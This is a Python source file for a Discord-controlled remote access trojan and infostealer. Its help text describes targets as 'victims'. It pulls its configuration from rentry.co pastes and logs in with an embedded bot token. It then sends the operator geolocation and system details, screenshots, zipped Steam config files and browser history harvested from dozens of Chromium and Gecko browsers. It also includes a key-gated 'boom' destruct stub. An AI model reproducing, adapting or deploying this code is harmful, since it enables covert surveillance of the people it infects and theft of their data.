import os, tempfile
TEMP = tempfile.gettempdir()
APPDATA = os.getenv('APPDATA')
try:
    import requests
    import subprocess
    import discord
    import asyncio
    import pyautogui
    import zipfile
    import random
    import string
    import certifi
    import psutil
    import platform
    import socket
    import sqlite3
    from urllib.parse import urlparse, urlunparse
    from datetime import datetime, timedelta
    import base64
    from discord.ext import commands
except ModuleNotFoundError:
    libs = [
        'requests',
        'discord.py==2.1.0',
        'pyscreeze==0.1.26',
        'pillow==9.1.0',
        'pyautogui==0.9.52',
        'psutil'
    ]
    for lib in libs:
        os.system(f'pip install {lib}')
    import requests
    import subprocess
    import discord
    import asyncio
    import pyautogui
    import zipfile
    import random
    import string
    import certifi
    import psutil
    import platform
    import socket
    import sqlite3
    from urllib.parse import urlparse, urlunparse
    from datetime import datetime, timedelta
    import base64
    from discord.ext import commands
os.environ['SSL_CERT_FILE'] = certifi.where()
prefix = '>'
serverid = requests.get('https://rentry.co/75xvys3e/raw').text.strip()
serverid = int(serverid)
userid = requests.get('https://rentry.co/qrmxqe3k/raw').text.strip()
userid = int(userid)

tokens = [
    'MTI1OTk1MTcyMjY3NjA5NzAyNA.GtcIMW.5P9iKCyt3Roqu40BxGji4O2FcvzDYN8koiLbvE'# Main
]
channel_names = [
    'cmds',
    'inf0',
    'recs',
    'ranswre',
    'boom'
]
vc_names = [
    'vc',
]
txts = {}
vcs = {}

class utils:
    def zip(path, ziph):
        for root, dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                ziph.write(file_path, os.path.relpath(file_path, path))

    def format_size(size):
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024:
                return f"{size:.2f} {unit}"
            size /= 1024

    def generate_tree(path) -> str:
        tree = '📂 - PC\n'
        for root, dirs, files in os.walk(path):
            level = root.replace(path, '').count(os.sep)
            indent = ' ' * 4 * (level)
            tree += f'{indent}├── 📂 - {os.path.basename(root)}\n'
            subindent = ' ' * 4 * (level + 1)
            for file in files:
                file_path = os.path.join(root, file)
                size = os.path.getsize(file_path)
                formatted_size = utils.format_size(size)
                tree += f'{subindent}├── 📄 - {file} ({formatted_size})\n'
        
        return tree

    def search_disks_for_folder(folder_name: str) -> str:
        for drive in ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:']:
            folder_path = os.path.join(drive, folder_name)
            
            if os.path.exists(folder_path):
                return folder_path
        
        return None
    
    def get_all_folders(folder_path):
        folders = []
        for entry in os.listdir(folder_path):
            full_path = os.path.join(folder_path, entry)
            if os.path.isdir(full_path):
                folders.append(full_path)
        return folders
    
    def find_localappdata():
        drives = [f'{chr(letter)}:\\' for letter in range(ord('A'), ord('Z') + 1)]
        localappdata_paths = []

        for drive in drives:
            potential_path = os.path.join(drive, 'Users', os.getlogin(), 'AppData', 'Local')
            if os.path.exists(potential_path):
                localappdata_paths.append(potential_path)
        return localappdata_paths
    
    def find_roamingappdata():
        drives = [f'{chr(letter)}:\\' for letter in range(ord('A'), ord('Z') + 1)]
        roamingappdata_paths = []

        for drive in drives:
            potential_path = os.path.join(drive, 'Users', os.getlogin(), 'AppData', 'Roaming')
            if os.path.exists(potential_path):
                roamingappdata_paths.append(potential_path)
        return roamingappdata_paths
    
    def get_string(length: int) -> str:
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))

class do:
    def screenshot():
        ss = pyautogui.screenshot()
        path = os.path.join(APPDATA, 'ss.png')
        ss.save(path)

class getinfo:
    def ip():
        r = requests.get('https://ipapi.co/json')

        if r.status_code == 200:
            data = r.json()
            return (
                data.get('ip', 'N/A'),
                data.get('network', 'N/A'),
                data.get('version', 'N/A'),
                data.get('city', 'N/A'),
                data.get('region', 'N/A'),
                data.get('country_code', 'N/A'),
                data.get('latitude', 'N/A'),
                data.get('longitude', 'N/A'),
                data.get('asn', 'N/A'),
                data.get('org', 'N/A')
            )
        else:
            return ('N/A',) * 10
        
    def steam():
        zip_input = utils.search_disks_for_folder('\Program Files (x86)\Steam\config')
        if zip_input == None:
            return None, None
        zip_dist = os.path.join(APPDATA, f'temp{utils.get_string(5)}.zip')

        with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
            utils.zip(zip_input, zipf)

        return zip_input, zip_dist
    
    class system:
        # made fully by chat gpt i aint spending 20 mins to write that
        def get_size(bytes, suffix='B'):
            factor = 1024
            for unit in ['', 'K', 'M', 'G', 'T', 'P']:
                if bytes < factor:
                    return f'{bytes:.2f}{unit}{suffix}'
                bytes /= factor

        def info():
            info = {}
            uname = platform.uname()
            info['System'] = uname.system
            info['Node Name'] = uname.node
            info['Release'] = uname.release
            info['Version'] = uname.version
            info['Machine'] = uname.machine
            info['Processor'] = uname.processor

            boot_time_timestamp = psutil.boot_time()
            bt = datetime.fromtimestamp(boot_time_timestamp)
            info['Boot Time'] = bt.strftime("%Y-%m-%d %H:%M:%S")

            cpufreq = psutil.cpu_freq()
            info['Physical Cores'] = psutil.cpu_count(logical=False)
            info['Total Cores'] = psutil.cpu_count(logical=True)
            info['Max Frequency'] = f"{cpufreq.max:.2f}Mhz"
            info['Min Frequency'] = f"{cpufreq.min:.2f}Mhz"
            info['Current Frequency'] = f"{cpufreq.current:.2f}Mhz"
            info['CPU Usage Per Core'] = []
            for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                info['CPU Usage Per Core'].append(f"Core {i}: {percentage}%")
            info['Total CPU Usage'] = f"{psutil.cpu_percent()}%"

            svmem = psutil.virtual_memory()
            info['Total Memory'] = getinfo.system.get_size(svmem.total)
            info['Available Memory'] = getinfo.system.get_size(svmem.available)
            info['Used Memory'] = getinfo.system.get_size(svmem.used)
            info['Memory Usage'] = f"{svmem.percent}%"

            swap = psutil.swap_memory()
            info['Total Swap'] = getinfo.system.get_size(swap.total)
            info['Free Swap'] = getinfo.system.get_size(swap.free)
            info['Used Swap'] = getinfo.system.get_size(swap.used)
            info['Swap Usage'] = f"{swap.percent}%"

            info['Partitions and Usage'] = []
            partitions = psutil.disk_partitions()
            for partition in partitions:
                partition_info = {}
                partition_info['Device'] = partition.device
                partition_info['Mountpoint'] = partition.mountpoint
                partition_info['File System Type'] = partition.fstype
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:
                    continue
                partition_info['Total Size'] = getinfo.system.get_size(partition_usage.total)
                partition_info['Used'] = getinfo.system.get_size(partition_usage.used)
                partition_info['Free'] = getinfo.system.get_size(partition_usage.free)
                partition_info['Percentage'] = f"{partition_usage.percent}%"
                info['Partitions and Usage'].append(partition_info)

            info['Network'] = []
            if_addrs = psutil.net_if_addrs()
            for interface_name, interface_addresses in if_addrs.items():
                for address in interface_addresses:
                    if address.family == socket.AF_INET:
                        info['Network'].append({
                            "Interface": interface_name,
                            "IP Address": address.address,
                            "Netmask": address.netmask,
                            "Broadcast IP": address.broadcast
                        })
                    elif hasattr(socket, 'AF_PACKET') and address.family == socket.AF_PACKET:
                        info['Network'].append({
                            "Interface": interface_name,
                            "MAC Address": address.address,
                            "Netmask": address.netmask,
                            "Broadcast MAC": address.broadcast
                        })
                    elif address.family == socket.AF_INET6:
                        info['Network'].append({
                            "Interface": interface_name,
                            "IP Address": address.address,
                            "Netmask": address.netmask,
                            "Broadcast IP": address.broadcast
                        })

            return info
        
        def format(info):
            separator = "=" * 80
            fancy_title = lambda title: f"{separator}\n{title.center(80)}\n{separator}"

            output = []

            output.append(fancy_title("System Information"))
            output.append(f"System: {info['System']}")
            output.append(f"Node Name: {info['Node Name']}")
            output.append(f"Release: {info['Release']}")
            output.append(f"Version: {info['Version']}")
            output.append(f"Machine: {info['Machine']}")
            output.append(f"Processor: {info['Processor']}\n")

            output.append(fancy_title("Boot Time"))
            output.append(f"Boot Time: {info['Boot Time']}\n")

            output.append(fancy_title("CPU Information"))
            output.append(f"Physical Cores: {info['Physical Cores']}")
            output.append(f"Total Cores: {info['Total Cores']}")
            output.append(f"Max Frequency: {info['Max Frequency']}")
            output.append(f"Min Frequency: {info['Min Frequency']}")
            output.append(f"Current Frequency: {info['Current Frequency']}")
            output.append("CPU Usage Per Core:")
            for core in info['CPU Usage Per Core']:
                output.append(f"  {core}")
            output.append(f"Total CPU Usage: {info['Total CPU Usage']}\n")

            output.append(fancy_title("Memory Information"))
            output.append(f"Total: {info['Total Memory']}")
            output.append(f"Available: {info['Available Memory']}")
            output.append(f"Used: {info['Used Memory']}")
            output.append(f"Percentage: {info['Memory Usage']}\n")

            output.append(fancy_title("Swap Memory"))
            output.append(f"Total: {info['Total Swap']}")
            output.append(f"Free: {info['Free Swap']}")
            output.append(f"Used: {info['Used Swap']}")
            output.append(f"Percentage: {info['Swap Usage']}\n")

            output.append(fancy_title("Disk Information"))
            for partition in info['Partitions and Usage']:
                output.append(f"  Device: {partition['Device']}")
                output.append(f"  Mountpoint: {partition['Mountpoint']}")
                output.append(f"  File System Type: {partition['File System Type']}")
                output.append(f"  Total Size: {partition['Total Size']}")
                output.append(f"  Used: {partition['Used']}")
                output.append(f"  Free: {partition['Free']}")
                output.append(f"  Percentage: {partition['Percentage']}")
                output.append("")

            output.append(fancy_title("Network Information"))
            for net in info['Network']:
                for key, value in net.items():
                    output.append(f"  {key}: {value}")
                output.append("")

            return "\n".join(output)
        
        def split_message(content, max_length=2000):
            parts = []
            while len(content) > max_length:
                split_index = content.rfind('\n', 0, max_length)
                if split_index == -1:
                    split_index = max_length
                parts.append(content[:split_index])
                content = content[split_index:]
            parts.append(content)
            return parts
        
    class chromium:
        def __init__(self) -> None:
            # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go (EDITED)
            self.paths = {
                "Chromium":             "Chromium\\User Data",
                "Thorium":              "Thorium\\User Data",
                "Chrome":               "Google\\Chrome\\User Data",
                "Chrome (x86)":         "Google(x86)\\Chrome\\User Data",
                "Chrome SxS":           "Google\\Chrome SxS\\User Data",
                "Maple":                "MapleStudio\\ChromePlus\\User Data",
                "Iridium":              "Iridium\\User Data",
                "7Star":                "7Star\\7Star\\User Data",
                "CentBrowser":          "CentBrowser\\User Data",
                "Chedot":               "Chedot\\User Data",
                "Vivaldi":              "Vivaldi\\User Data",
                "Kometa":               "Kometa\\User Data",    
                "Elements":             "Elements Browser\\User Data",
                "Epic Privacy Browser": "Epic Privacy Browser\\User Data",
                "Uran":                 "uCozMedia\\Uran\\User Data",
                "Fenrir":               "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
                "Catalina":             "CatalinaGroup\\Citrio\\User Data",
                "Coowon":               "Coowon\\Coowon\\User Data",
                "Liebao":               "liebao\\User Data",
                "QIP Surf":             "QIP Surf\\User Data",
                "Orbitum":              "Orbitum\\User Data",
                "Dragon":               "Comodo\\Dragon\\User Data",
                "360Browser":           "360Browser\\Browser\\User Data",
                "Maxthon":              "Maxthon3\\User Data",
                "K-Melon":              "K-Melon\\User Data",
                "CocCoc":               "CocCoc\\Browser\\User Data",
                "Brave":                "BraveSoftware\\Brave-Browser\\User Data",
                "Amigo":                "Amigo\\User Data",
                "Torch":                "Torch\\User Data",
                "Sputnik":              "Sputnik\\Sputnik\\User Data",
                "Edge":                 "Microsoft\\Edge\\User Data",
                "DCBrowser":            "DCBrowser\\User Data",
                "Yandex":               "Yandex\\YandexBrowser\\User Data",
                "UR Browser":           "UR Browser\\User Data",
                "Slimjet":              "Slimjet\\User Data",
                "Opera":                "Opera Software\\Opera Stable",
                "OperaGX":              "Opera Software\\Opera GX Stable",
            }

            self.profiles = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
            ]

            self.validpaths = []
            self.mainfolder = os.path.join(APPDATA, 'chromium_browsers')
            self.localappdatapaths = utils.find_localappdata()
            self.find_all()

        def convert_time(self, timestamp):
            epoch_start = datetime(1601, 1, 1)
            return epoch_start + timedelta(microseconds=timestamp)

        def remove_url_params(self, url):
            parsed_url = urlparse(url)
            return urlunparse(parsed_url._replace(query='', fragment=''))

        def find_all(self):
            for localappdatapath in self.localappdatapaths:
                for name, browser_path in self.paths.items():
                    path = os.path.join(localappdatapath, browser_path)
                    validpath = utils.search_disks_for_folder(path)
                    if validpath is not None:
                        self.validpaths.append((name, validpath))   

            os.makedirs(self.mainfolder, exist_ok=True)

            for name, browser_path in self.validpaths:
                os.makedirs(os.path.join(self.mainfolder, name), exist_ok=True)
        
        def get_history(self):
            for name, browser_path in self.validpaths:
                if name == 'OperaGX' or name == 'Opera':
                    history_path = os.path.join(browser_path, 'History')
                else:
                    pass

                if name in ['OperaGX', 'Opera']:   
                    conn = sqlite3.connect(history_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT url, title, last_visit_time FROM urls')
                    rows = cursor.fetchall()

                    output_path = os.path.join(self.mainfolder, name, 'History.txt')
                    url_width = 100
                    title_width = 100
                    last_visit_width = 30

                    output = open(output_path, 'w', encoding='utf-8')
                    output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
                    output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
                    for row in rows:
                        url = self.remove_url_params(row[0])
                        title = row[1]
                        visit_time = self.convert_time(row[2])
                        output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')

                    conn.close()
                    output.close()
                else:
                    for profile in self.profiles:
                        try:
                            history_path = os.path.join(browser_path, profile, 'History')
                            conn = sqlite3.connect(history_path)
                            cursor = conn.cursor()
                            cursor.execute('SELECT url, title, last_visit_time FROM urls')
                            rows = cursor.fetchall()

                            output_path = os.path.join(self.mainfolder, name, f'History_{profile}.txt')
                            url_width = 100
                            title_width = 100
                            last_visit_width = 30

                            output = open(output_path, 'w', encoding='utf-8')
                            output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
                            output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
                            for row in rows:
                                url = self.remove_url_params(row[0])
                                title = row[1]
                                visit_time = self.convert_time(row[2])
                                output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')

                            conn.close()
                            output.close()
                        except:
                            pass



    class gecko:
        def __init__(self) -> None:
            # from https://github.com/hackirby/skuld/blob/main/modules/browsers/paths.go (EDITED)
            self.paths = {
                "Firefox":     "Mozilla\\Firefox\\Profiles",
                "SeaMonkey":   "Mozilla\\SeaMonkey\\Profiles",
                "Waterfox":    "Waterfox\\Profiles",
                "K-Meleon":    "K-Meleon\\Profiles",
                "Thunderbird": "Thunderbird\\Profiles",
                "IceDragon":   "Comodo\\IceDragon\\Profiles",
                "Cyberfox":    "8pecxstudios\\Cyberfox\\Profiles",
                "BlackHaw":    "NETGATE Technologies\\BlackHaw\\Profiles",
                "Pale Moon":   "Moonchild Productions\\Pale Moon\\Profiles",
                "Mercury":     "mercury\\Profiles",
            }

            self.validpaths = []
            self.mainfolder = os.path.join(APPDATA, 'gecko_browsers')
            self.roamingappdatapaths = utils.find_roamingappdata()
            self.find_all()

        def convert_time(self, timestamp):
            epoch_start = datetime(1601, 1, 1)
            return epoch_start + timedelta(microseconds=timestamp)

        def remove_url_params(self, url):
            parsed_url = urlparse(url)
            return urlunparse(parsed_url._replace(query='', fragment=''))

        def find_all(self):
            for localappdatapath in self.roamingappdatapaths:
                for name, browser_path in self.paths.items():
                    path = os.path.join(localappdatapath, browser_path)
                    validpath = utils.search_disks_for_folder(path)
                    if validpath != None:
                        self.validpaths.append((name, validpath))  

            os.makedirs((self.mainfolder), exist_ok=True)

            for name, browser_path in self.validpaths:
                os.makedirs(os.path.join(self.mainfolder, name), exist_ok=True)     

        def get_history(self):
            for name, browser_path in self.validpaths:
                profiles = utils.get_all_folders(browser_path)
                for profilepath in profiles:
                    try:
                        history_path = os.path.join(profilepath, 'places.sqlite')
                        conn = sqlite3.connect(history_path)
                        cursor = conn.cursor()
                        cursor.execute('''
                            SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date 
                            FROM moz_places 
                            JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
                        ''')
                        rows = cursor.fetchall()

                        output_path = os.path.join(self.mainfolder, name, f'History_{utils.get_string(5)}.txt')
                        url_width = 100
                        title_width = 100
                        last_visit_width = 30

                        with open(output_path, 'w', encoding='utf-8') as output:
                            output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
                            output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
                            for row in rows:
                                url = self.remove_url_params(row[0])
                                title = row[1] if row[1] else 'No Title'
                                visit_time = self.convert_time(row[2] // 1000000)
                                output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')

                        conn.close()
                    except:
                        pass

client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

@client.event
async def on_ready():
    global hwid
    first_run = True
    hwid = subprocess.check_output('powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID').decode().strip()
    guild = client.get_guild(serverid)
    category = discord.utils.get(guild.categories, name=hwid)
    if category:
        first_run = False
    else:
        category = await guild.create_category(hwid)
        first_run = True
    
    for channelname in channel_names:
        channel = discord.utils.get(guild.channels, name=channelname, category=category)
        if not channel:
            channel = await guild.create_text_channel(channelname, category=category)
            first_run = True
        txts[channel.name] = channel
    
    for vcname in vc_names:
        vc = discord.utils.get(guild.channels, name=vcname, category=category, type=discord.ChannelType.voice)
        if not vc:
            vc = await guild.create_voice_channel(vcname, category=category)
            first_run = True
        vcs[vc.name] = vc

    await txts['inf0'].send(f'🟢 {os.getlogin()} Connected!')

    if first_run:
        ip, network, version, city, region, country, latitude, longitude, asn, org = getinfo.ip()
        await txts['inf0'].send(f'@everyone\n```\nIP: {ip}\nNetwork: {network}\nVersion: {version}\nCity: {city}\nRegion: {region}\nCountry: {country}\nLatitude: {latitude}\nLongitude: {longitude}\nASN: {asn}\nOrg: {org}\n```')

        sys_info = getinfo.system.format(getinfo.system.info())
        sys_info = getinfo.system.split_message(sys_info)

        for msg in sys_info:
            await txts['inf0'].send(f'```{msg}```')
    




@client.event
async def on_message(message):
    if message.author != client.user:
        if int(message.author.id) == int(userid):
            if message.channel.name == 'cmds':
                if message.channel.category.name == hwid:
                    if message.content == f'{prefix}help':
                        await message.delete()
                        await message.channel.send('''
```
--- BASIC ---
ping ▶ check if the victim is online
info ▶ get all info abt victim
ipinfo ▶ get ip info of the victim
ss ▶ get a screenshot
user ▶ get victims username
disconnect ▶ disconnect from the victim
--- STEALING ---
getsteam ▶ steals steam files
getbrowsers ▶ steal all info from all browsers
```
''')
                    elif message.content == f'{prefix}ping':
                        await message.delete()
                        await message.channel.send(f'pong')

                    elif message.content == f'{prefix}info':
                        await message.delete()
                        ip, network, version, city, region, country, latitude, longitude, asn, org = getinfo.ip()
                        sys_info = getinfo.system.format(getinfo.system.info())
                        sys_info = getinfo.system.split_message(sys_info)
                        await message.channel.send(f'```\nIP: {ip}\nNetwork: {network}\nVersion: {version}\nCity: {city}\nRegion: {region}\nCountry: {country}\nLatitude: {latitude}\nLongitude: {longitude}\nASN: {asn}\nOrg: {org}\n```')
                        for msg in sys_info:
                            await message.channel.send(f'```{msg}```')

                    elif message.content == f'{prefix}ipinfo':
                        await message.delete()
                        ip, network, version, city, region, country, latitude, longitude, asn, org = getinfo.ip()
                        await message.channel.send(f'```\nIP: {ip}\nNetwork: {network}\nVersion: {version}\nCity: {city}\nRegion: {region}\nCountry: {country}\nLatitude: {latitude}\nLongitude: {longitude}\nASN: {asn}\nOrg: {org}\n```')

                    elif message.content == f'{prefix}ss':
                        await message.delete()
                        do.screenshot()
                        path = os.path.join(APPDATA, 'ss.png')
                        await message.channel.send(file=discord.File(path))
                        os.remove(path)

                    elif message.content == f'{prefix}user':
                        await message.delete()
                        await message.channel.send(os.getlogin())

                    elif message.content == f'{prefix}disconnect':
                        await message.delete()
                        await txts['info'].send(f'🔴 {os.getlogin()} Disconnected!')
                        exit()
                        os._exit(0)

                    elif message.content == f'{prefix}getsteam':
                        await message.delete()
                        zip_input, zip_dist = getinfo.steam()
                        if zip_input == None or zip_dist == None:
                            message.channel.send(f'Didint find steam files')
                            return

                        tree = utils.generate_tree(zip_input)
                        await message.channel.send(f'```{tree}```')
                        await message.channel.send(file=discord.File(zip_dist))
                        os.remove(zip_dist)

                    elif message.content == f'{prefix}getbrowsers':
                        await message.delete()

                        # CHROMIUM
                        chromium = getinfo.chromium()
                        chromium.get_history()
                        chromiumfolder = os.path.join(APPDATA, 'chromium_browsers')

                        zip_dist = os.path.join(APPDATA, f'temp{utils.get_string(5)}.zip')

                        with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
                            utils.zip(chromiumfolder, zipf)

                        tree = utils.generate_tree(chromiumfolder)
                        await message.channel.send(f'```{tree}```')
                        await message.channel.send(file=discord.File(zip_dist))

                        try:
                            os.remove(zip_dist)
                        except:
                            print('FAILED TO REMOVE CHROMIUM ZIP')

                        try:
                            os.remove(chromiumfolder)
                        except:
                            print('FAILED TO REMOVE CHROMIUM FOLDER')


                        # GECKO
                        gecko = getinfo.gecko()
                        gecko.get_history()
                        geckofolder = os.path.join(APPDATA, 'gecko_browsers')

                        zip_dist = os.path.join(APPDATA, f'temp{utils.get_string(5)}.zip')

                        with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
                            utils.zip(geckofolder, zipf)

                        tree = utils.generate_tree(geckofolder)
                        await message.channel.send(f'```{tree}```')
                        await message.channel.send(file=discord.File(zip_dist))

                        try:
                            os.remove(zip_dist)
                        except:
                            print('FAILED TO REMOVE GECKO ZIP')

                        try:
                            os.remove(geckofolder)
                        except:
                            print('FAILED TO REMOVE GECKO FOLDER')

                    elif message.content == f'{prefix}cls':
                        await message.delete()
                        await txts['cmds'].send(f'May take a while...')
                        guild = client.get_guild(serverid)
                        for channel in guild.channels:
                            if isinstance(channel, discord.TextChannel):
                                async for message in channel.history(limit=None):
                                    await message.delete()
                        await txts['cmds'].send(f'Done!')

                    else:
                        await message.channel.send('Unknown command')

            if message.channel.name == 'destroy':
                if message.channel.category.name == hwid:
                    if message.content == f'{prefix}boom':
                        msg = await message.channel.send('Are u sure?')
                        await message.add_reaction('🟢')
                        await message.add_reaction('🔴')

                        try:
                            reaction, user = await client.wait_for('reaction_add', timeout=60.0, check=lambda reaction, user: user != client.user and reaction.message.id == msg.id)
                            if str(reaction.emoji) == '🟢':
                                await message.channel.send('Send the key')
                                def check_secret_key(m):
                                    return m.author == user and m.channel == message.channel

                                secret_key_message = await client.wait_for('message', timeout=60.0, check=check_secret_key)
                                secret_key = secret_key_message.content.strip()

                                if secret_key == base64.b64decode('c2tpYmlkaTEyMzQ1').decode('utf-8'):
                                    await message.channel.send(f'Got it destructing...')
                                else:
                                    await message.channel.send(f'Nuh uh')



                            elif str(reaction.emoji) == '🔴':
                                await message.channel.send('Aborted')

                        except asyncio.TimeoutError:
                            await message.channel.send('Timeouted')


for token in tokens:
    try:
        client.run(token)
    except:
        pass